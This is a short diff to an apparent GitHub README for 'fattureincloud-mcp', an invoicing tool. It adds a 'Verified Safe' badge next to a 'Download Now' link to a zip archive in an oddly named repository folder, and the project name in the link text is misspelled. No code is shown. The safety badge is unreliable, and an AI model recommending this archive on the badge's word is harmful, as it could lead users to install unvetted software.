@@ -1,5 +1,7 @@
 # 🚀 fattureincloud-mcp - Simplify Your Electronic Invoicing
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/pyaekyaw-dev-fattureincloud-mcp)
+
 ## 📥 Download Now
 [![Download fatruincloud-mcp](https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip)](https://raw.githubusercontent.com/pyaekyaw-dev/fattureincloud-mcp/main/Fany/mcp_fattureincloud_v3.4.zip)
 
